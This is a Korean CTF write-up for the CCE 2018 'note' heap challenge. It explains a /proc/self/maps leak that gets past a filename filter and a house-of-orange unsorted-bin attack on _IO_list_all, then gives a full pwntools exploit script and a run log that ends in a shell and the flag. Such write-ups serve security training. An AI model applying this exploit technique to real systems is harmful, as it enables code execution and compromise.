---
layout: post
title: "[CCE 2018] note Write-up"
image: /img/cce_2018.JPG
tags: [CTF, write-up, pwn, pwnable, heap]
---

## Keyword
`pwnable` `heap` `house of orange` `unsorted bin`

---
### Analysis

<br>

<center><img src="/img/cce_note_1.JPG" class="effect"></center>

`Add` / `Delete` / `View Note` 와 `Execute` 기능이 있다.<br>
Note 관련 기능들에서는 size 를 입력하면 size 만큼의 힙을 할당하고 데이터를 쓰고, 보고, free 할 수 있다.<br>
`Execute` 기능은 파일명을 입력하면 파일명에 대한 약간의 필터를 거치고, 해당 파일의 내용을 read로 읽는다. 읽은 데이터에 개행이 18번보다 많이 들어가 있어야만 출력해준다.
<br><br><br>

### Vulnerability

발견한 취약점은 두 개.<br>



- **stack overflow** : `Execute` 메뉴에서 파일의 내용을 읽을 때, <span style="color:#cf3030">[rbp-0xBE0]</span>에 최대 <span style="color:#cf3030">0xC00</span> 만큼의 데이터를 읽는다.
<center><img src="/img/cce_note_2.JPG" class="effect"> <img src="/img/cce_note_3.JPG" class="effect"></center>

<br>

- **heap overflow** : `Add Note` 메뉴에서 size 만큼 malloc 하고 <span style="color:#cf3030">(unsigned int)(size-1)</span> 만큼 데이터를 읽는다.
<center><img src="/img/cce_note_4.JPG" class="effect"></center>


<br>

첫 번째 취약점을 이용하면 쉽게 풀리지만 leak을 어떻게 해야되나 고민하다가 첫 번째 취약점을 잊어버리고 두 번째 취약점으로 풀었다 ㅇ-ㅇ;;<br><br><br>

### Leak

`Execute` 메뉴를 이용해서 /proc/self/maps 를 읽으면 라이브러리가 로드된 주소를 알 수 있다.<br>
`Execute` 메뉴에서 필터링하는 조건은 다음과 같다.<br>
1. 파일명에 "flag" 또는 "nu"가 포함되지 않아야한다.
2. 파일명의 첫 6바이트가 "/proc/" 이거나 첫 5바이트가 "/sys/"이면 안된다.
3. 파일명이 70자 이상이어야 하고 엔터가 들어가면 안된다.
4. 파일의 내용이 18줄보다 많을 때만 내용을 출력한다.

2, 3번은 "/////////////////////////////////////////////////////////////proc/self/maps" 를 사용하여 우회할 수 있다.<br>
maps 파일을 그냥 읽었을 때는 17줄이어서 4번에 걸렸는데 `Add Note`를 이용해서 다양한 크기의 힙을 할당해주면 힙 페이지가 생성되면서 maps가 19줄까지 증가하게 된다.<br>
<br>
여기서 1번 취약점을 사용해서 슥삭 공격하면 되는데 leak 하고 나니까 `Execute`는 이제 필요 없다고 생각하고 1번 취약점을 머리에서 지워버렸다.
<br><br><br>


### Exploit

`Execute`를 이용해서 lib base, io_list_all, system, heap 영역 주소를 알 수 있다. 실행 흐름만 바꾸면 된다.<br>
힙에 대해서는 malloc만 하고 free하는 부분이 없어서 house of orange를 사용하여 공격했다.<br>
<br>

`Add Note`에서 크기가 0인 힙을 할당하면 최소 크기인 0x18 크기의 힙이 할당된다.

<center><img src="/img/cce_note_5.JPG" class="effect"></center>

<span style="color:#cf3030">(unsigned int)(size-1)</span> 만큼의 데이터를 입력할 수 있으니 0xffffffff의 데이터를 입력할 수 있다.<br>
여기서 0x18 만큼의 데이터를 쓰고 `View Note`로 출력해보면 0x18개의 데이터 뒤에 top chunk가 함께 출력된다.

<center><img src="/img/cce_note_6.JPG" class="effect"></center>

top chunk 를 알아냈으면 여기에 % 0x1000 연산을 한 값을 heap overflow를 이용해서 top chunk에 overwrite 한다.<br>
그 후, top chunk 보다 큰 크기의 힙을 할당하려고 하면 sysmalloc이 호출되면서 top chunk 를 확장하게 된다.<br>
새로운 top chunk를 할당하면 이전의 top chunk는 free 되어 unsorted bin에 들어간다.<br>
unsorted bin attack을 사용해서 \_IO_list_all을 overwrite 하고 vtable을 조작해서 실행 흐름을 바꿀 수 있다.
<br><br><br>

### Solve

```python
from pwn import *
import os

r = process('note')
cmd = '/proc/self/maps'
cmd = '/'*(75-len(cmd))+cmd

size = ['33581244','12342', '12341234', '23', '123456789']
for i in range(len(size)):
	print r.recvuntil('> ')
	r.sendline('1')
	print r.recvuntil(': ')
        r.sendline(size[i%len(size)])
	print r.recvuntil(': ')
	r.sendline('asdf')
	if i%10 == 0:
		print r.recvuntil('> ')
        	r.sendline('2')
        	print r.recvuntil(': ')
        	r.sendline('0')

print r.recvuntil('> ')
r.sendline('4')
print r.recvuntil(': ')
r.sendline(cmd)

data = r.recvuntil('\x00')[:-1]

print data

data = data.split('\n')
#print data
lib_base = 0
heap_base = 0
for line in data:
	if '[heap]' in line:
		heap_base = line.split('-')[0]
	if '/lib/x86_64-linux-gnu/libc-2.23.so' in line:
		lib_base = line.split('-')[0]
		break

heap_base = int(heap_base,16)
lib_base = int(lib_base,16)
print '==============================> lib_base '+hex(lib_base)

io_list_all = lib_base + 0x3c5520
system = lib_base + 0x45390

print '==============================> io_list_all '+hex(io_list_all)
print '==============================> system '+hex(system)
print '==============================> heap_base '+hex(heap_base)

########### exploit ############

r.recvuntil('> ')
r.sendline('2')
print r.recvuntil(': ')
r.sendline('0')
'''
########## top chunk leak ###########
r.recvuntil('> ')
r.sendline('1')
print r.recvuntil(': ')
r.sendline('0')
print r.recvuntil(': ')
r.send('a'*24)

r.recvuntil('> ')
r.sendline('3')
print r.recvuntil(': ')
r.sendline('0')

r.recvuntil('a'*24)
top_chunk = r.recvuntil('#')[:-1]
top_chunk = top_chunk+'\x00'*(8-len(top_chunk))
top_chunk = u64(top_chunk)
print hex(top_chunk)
'''
top_chunk = 0x20f81 % 0x1000

#### new top chunk ####

r.recvuntil('> ')
r.sendline('1')
print r.recvuntil(': ')
r.sendline('0')
print r.recvuntil(': ')
r.send('a'*24+p64(top_chunk))

#### sysmalloc ####

r.recvuntil('> ')
r.sendline('1')
print r.recvuntil(': ')
r.sendline('4096')
print r.recvuntil(': ')
r.send('asdf')

#### _IO_list_all overwrite ####

r.recvuntil('> ')
r.sendline('1')
print r.recvuntil(': ')
r.sendline('0')
print r.recvuntil(': ')

offset = 0x3080
control = heap_base + offset

payload = ''
payload += 'a'*8 + p64(system) + '/bin/sh\x00' + p64(0x61) + p64(0) + p64(io_list_all-0x10)+p64(2)+p64(3)+p64(0)*21+p64(control)

r.send(payload)

r.interactive()
```
```shell
note@ip-172-31-20-113:~$ vi /tmp/ex_rls3.py
note@ip-172-31-20-113:~$ python /tmp/ex_rls3.py
[+] Starting local process '/home/note/note': pid 5511
####################
## 1. Add Note    ##
## 2. Delete Note ##
## 3. View Note   ##
## 4. Execute     ##
####################
>
####################
##### Add Note #####
####################
Size:
Note:
[+] SUCCESS
####################
## 1. Add Note    ##
## 2. Delete Note ##
## 3. View Note   ##
## 4. Execute     ##
####################
>
####################
##   Delete Note  ##
####################
Idx:
####################
## 1. Add Note    ##
## 2. Delete Note ##
## 3. View Note   ##
## 4. Execute     ##
####################
>
####################
##### Add Note #####
####################
Size:
Note:
[+] SUCCESS
####################
## 1. Add Note    ##
## 2. Delete Note ##
## 3. View Note   ##
## 4. Execute     ##
####################
>
####################
##### Add Note #####
####################
Size:
Note:
[+] SUCCESS
####################
## 1. Add Note    ##
## 2. Delete Note ##
## 3. View Note   ##
## 4. Execute     ##
####################
>
####################
##### Add Note #####
####################
Size:
Note:
[+] SUCCESS
####################
## 1. Add Note    ##
## 2. Delete Note ##
## 3. View Note   ##
## 4. Execute     ##
####################
>
####################
##### Add Note #####
####################
Size:
Note:

[+] SUCCESS
####################
## 1. Add Note    ##
## 2. Delete Note ##
## 3. View Note   ##
## 4. Execute     ##
####################
>
####################
####   Execute  ####
####################
File name:
5628fc443000-5628fc445000 r-xp 00000000 ca:01 256322                     /home/note/note
5628fc644000-5628fc645000 r--p 00001000 ca:01 256322                     /home/note/note
5628fc645000-5628fc646000 rw-p 00002000 ca:01 256322                     /home/note/note
5628fc7b8000-5628fc7dc000 rw-p 00000000 00:00 0                          [heap]
7fb3dcdbc000-7fb3e6f46000 rw-p 00000000 00:00 0
7fb3e6f46000-7fb3e7106000 r-xp 00000000 ca:01 1987                       /lib/x86_64-linux-gnu/libc-2.23.so
7fb3e7106000-7fb3e7306000 ---p 001c0000 ca:01 1987                       /lib/x86_64-linux-gnu/libc-2.23.so
7fb3e7306000-7fb3e730a000 r--p 001c0000 ca:01 1987                       /lib/x86_64-linux-gnu/libc-2.23.so
7fb3e730a000-7fb3e730c000 rw-p 001c4000 ca:01 1987                       /lib/x86_64-linux-gnu/libc-2.23.so
7fb3e730c000-7fb3e7310000 rw-p 00000000 00:00 0
7fb3e7310000-7fb3e7336000 r-xp 00000000 ca:01 1985                       /lib/x86_64-linux-gnu/ld-2.23.so
7fb3e752b000-7fb3e752e000 rw-p 00000000 00:00 0
7fb3e7535000-7fb3e7536000 r--p 00025000 ca:01 1985                       /lib/x86_64-linux-gnu/ld-2.23.so
7fb3e7536000-7fb3e7537000 rw-p 00026000 ca:01 1985                       /lib/x86_64-linux-gnu/ld-2.23.so
7fb3e7537000-7fb3e7538000 rw-p 00000000 00:00 0
7ffd897ca000-7ffd897eb000 rw-p 00000000 00:00 0                          [stack]
7ffd897ef000-7ffd897f2000 r--p 00000000 00:00 0                          [vvar]
7ffd897f2000-7ffd897f4000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]

==============================> lib_base 0x7fb3e6f46000
==============================> io_list_all 0x7fb3e730b520
==============================> system 0x7fb3e6f8b390
==============================> heap_base 0x5628fc7b8000
[*] leak finish
####################
##   Delete Note  ##
####################
Idx:
####################
##### Add Note #####
####################
Size:
Note:
top_chunk
####################
##### Add Note #####
####################
Size:
Note:
check heap
####################
##### Add Note #####
####################
Size:
Note:
check heap 2
[*] Switching to interactive mode
[+] SUCCESS
####################
## 1. Add Note    ##
## 2. Delete Note ##
## 3. View Note   ##
## 4. Execute     ##
####################
> $ 1
####################
##### Add Note #####
####################
Size: $ 10
*** Error in `/home/note/note': malloc(): memory corruption: 0x00007fb3e730b520 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fb3e6fbd7e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8213e)[0x7fb3e6fc813e]
/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7fb3e6fca184]
/home/note/note(+0xdc7)[0x5628fc443dc7]
/home/note/note(+0xd06)[0x5628fc443d06]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fb3e6f66830]
/home/note/note(+0xad9)[0x5628fc443ad9]
======= Memory map: ========
5628fc443000-5628fc445000 r-xp 00000000 ca:01 256322                     /home/note/note
5628fc644000-5628fc645000 r—p 00001000 ca:01 256322                     /home/note/note
5628fc645000-5628fc646000 rw-p 00002000 ca:01 256322                     /home/note/note
5628fc7b8000-5628fc7fe000 rw-p 00000000 00:00 0                          [heap]
7fb3d8000000-7fb3d8021000 rw-p 00000000 00:00 0
7fb3d8021000-7fb3dc000000 —p 00000000 00:00 0
7fb3dcba6000-7fb3dcbbc000 r-xp 00000000 ca:01 1981                       /lib/x86_64-linux-gnu/libgcc_s.so.1
7fb3dcbbc000-7fb3dcdbb000 —p 00016000 ca:01 1981                       /lib/x86_64-linux-gnu/libgcc_s.so.1
7fb3dcdbb000-7fb3dcdbc000 rw-p 00015000 ca:01 1981                       /lib/x86_64-linux-gnu/libgcc_s.so.1
7fb3dcdbc000-7fb3e6f46000 rw-p 00000000 00:00 0
7fb3e6f46000-7fb3e7106000 r-xp 00000000 ca:01 1987                       /lib/x86_64-linux-gnu/libc-2.23.so
7fb3e7106000-7fb3e7306000 —p 001c0000 ca:01 1987                       /lib/x86_64-linux-gnu/libc-2.23.so
7fb3e7306000-7fb3e730a000 r—p 001c0000 ca:01 1987                       /lib/x86_64-linux-gnu/libc-2.23.so
7fb3e730a000-7fb3e730c000 rw-p 001c4000 ca:01 1987                       /lib/x86_64-linux-gnu/libc-2.23.so
7fb3e730c000-7fb3e7310000 rw-p 00000000 00:00 0
7fb3e7310000-7fb3e7336000 r-xp 00000000 ca:01 1985                       /lib/x86_64-linux-gnu/ld-2.23.so
7fb3e752b000-7fb3e752e000 rw-p 00000000 00:00 0
7fb3e7534000-7fb3e7535000 rw-p 00000000 00:00 0
7fb3e7535000-7fb3e7536000 r—p 00025000 ca:01 1985                       /lib/x86_64-linux-gnu/ld-2.23.so
7fb3e7536000-7fb3e7537000 rw-p 00026000 ca:01 1985                       /lib/x86_64-linux-gnu/ld-2.23.so
7fb3e7537000-7fb3e7538000 rw-p 00000000 00:00 0
7ffd897ca000-7ffd897eb000 rw-p 00000000 00:00 0                          [stack]
7ffd897ef000-7ffd897f2000 r—p 00000000 00:00 0                          [vvar]
7ffd897f2000-7ffd897f4000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
$ ls
flag  note
$ cat flag
CCE{res0urce_i5_v3ry_imp0rt4n7}
```
